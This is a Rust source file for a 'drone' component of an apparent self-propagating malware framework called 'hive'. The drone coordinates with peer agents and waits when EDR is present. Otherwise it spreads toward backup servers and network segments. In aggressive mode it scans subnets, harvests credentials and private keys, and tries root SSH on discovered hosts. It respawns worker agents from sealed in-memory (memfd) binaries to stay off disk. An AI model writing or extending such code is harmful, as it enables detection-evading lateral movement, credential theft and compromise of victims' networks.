use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Value};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use std::process::Command;
use std::fs;
use std::env;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

const MODEL_ENC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/shaper_policy.onnx.enc"));

enum ShaperAction { PropagateTo(String), Wait }

struct ShaperAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    dead_agents: Vec<Uuid>,
    heartbeat_interval: Duration,
    decision_interval: Duration,
}

impl ShaperAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Drone).await.expect("Hive arena");
        info!("Drone connected to hive arena");
        Self { comms, identity, consensus: ConsensusEngine::new(0.66), dead_agents: vec![], heartbeat_interval: Duration::from_secs(10), decision_interval: Duration::from_secs(30) }
    }

    fn select_action(&self, b: &HashMap<String, Value>) -> ShaperAction {
        let edr = b.iter().any(|(k,v)| k.contains("edr") && matches!(v, Value::Bool(true)));
        let bu = b.iter().any(|(k,v)| k.contains("backup") && matches!(v, Value::Bool(true)));
        if edr { ShaperAction::Wait } else if bu { ShaperAction::PropagateTo("backup_server".into()) } else { ShaperAction::PropagateTo("network_segment".into()) }
    }

    async fn collect_beliefs(&mut self) -> HashMap<String, Value> {
        let mut b = HashMap::new();
        for msg in self.comms.read_new().await {
            self.consensus.process_message(&msg);
            if let Payload::Belief { asset, value, .. } = &msg.payload { b.insert(asset.clone(), value.clone()); }
            if let Payload::StatusEvent { event_type, subject_id, .. } = &msg.payload {
                if event_type == "agent_dead" && !self.dead_agents.contains(subject_id) { self.dead_agents.push(*subject_id); }
            }
        }
        b
    }

    async fn publish(&self, msg: Message) { self.comms.publish(msg).await; }

    async fn make_decision(&mut self, beliefs: &HashMap<String, Value>) {
        let cfg = hive_base::config::HiveConfig::load();
        if cfg.colony.aggressive {
            for subnet in &cfg.colony.scan_subnets {
                for host in hive_base::discover_hosts(subnet).iter().take(3) {
                    if !hive_base::panal::is_safe_target(host, &cfg.brain) {
                        info!("Colony: attacking {}", host);
                        let keys = hive_base::harvest_credentials();
                        for (_, kd, _) in &keys {
                            if kd.contains("PRIVATE KEY") { let _ = hive_base::exec_ssh(host, "root", "id", None, None); }
                        }
                    }
                }
            }
            return;
        }
        match self.select_action(beliefs) {
            ShaperAction::PropagateTo(t) => {
                let (msg, _) = Message::proposal(self.identity.id(), Role::Drone, format!("prop_to_{}", t), t.clone());
                self.publish(msg).await;
            }
            ShaperAction::Wait => info!("Waiting"),
        }
    }

    async fn check_regenerate(&mut self) {
        let dead = self.comms.check_dead_agents(30).await;
        for id in &dead { if !self.dead_agents.contains(id) { self.dead_agents.push(*id); } }
        let active = self.comms.get_active_agents(30).await;
        let workers = active.iter().filter(|(_,r,_)| matches!(r, Role::Worker)).count();
        if workers < 2 { warn!("Regenerating worker..."); self.regenerate_agent(Role::Worker).await; }
    }

    async fn regenerate_agent(&self, role: Role) {
        let name = match role { Role::Worker => "worker", Role::Weaver => "weaver", Role::Honeybee => "honeybee", Role::Queen => "queen", _ => return };
        let dir = env::current_exe().ok().and_then(|p| p.parent().map(|p| p.to_path_buf())).unwrap_or_else(|| ".".into());
        let path = dir.join(name);
        if !path.exists() { warn!("No binary: {:?}", path); return; }
        let data = match fs::read(&path) { Ok(d) => d, Err(_) => return };
        let arena = env::var("__HIVE_ARENA").unwrap_or_default();
        match hive_base::MemfdBinary::new(&format!("hive_{}", name), &data) {
            Ok(memfd) => { let _ = memfd.seal(); let _ = memfd.spawn(&[("__HIVE_ARENA", &arena)]); }
            Err(_) => {}
        }
    }

    async fn run(&mut self) {
        info!("Drone active | ID: {}", self.identity.id());
        let mut hb = time::interval(self.heartbeat_interval);
        let mut dec = time::interval(self.decision_interval);
        loop {
            tokio::select! {
                _ = hb.tick() => { self.comms.send_heartbeat().await; self.check_regenerate().await; }
                _ = dec.tick() => { let b = self.collect_beliefs().await; if !b.is_empty() { self.make_decision(&b).await; } }
                _ = time::sleep(Duration::from_millis(200)) => { let _ = self.collect_beliefs().await; }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("drone");
    info!("Hive Drone initializing...");
    ShaperAgent::new().await.run().await;
}
